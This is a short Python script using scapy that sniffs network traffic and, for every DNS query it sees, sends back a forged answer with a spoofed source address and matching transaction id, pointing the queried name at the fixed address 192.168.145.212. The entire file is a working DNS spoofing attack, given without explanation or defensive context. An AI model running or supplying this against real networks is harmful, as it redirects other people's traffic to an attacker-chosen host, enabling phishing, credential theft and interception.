from scapy.all import *


def callback(packet):
    if packet.haslayer(DNS):
        if packet[DNS].opcode == 0 and packet[DNS][DNSQR]:
            ip = packet.getlayer(IP)
            dns = packet.getlayer(DNS)
            udp = packet.getlayer(UDP)
            dns_reply = IP(src=ip.dst,dst=ip.src)/UDP(dport=udp.sport,sport=udp.dport)/DNS(id=dns.id,qr=1,aa=0,rcode=0,qd=dns.qd,an=DNSRR(rrname=dns.qd.qname,ttl=10,type="A",rclass="IN",rdata="192.168.145.212"))
            send(dns_reply)
sniff(prn=callback)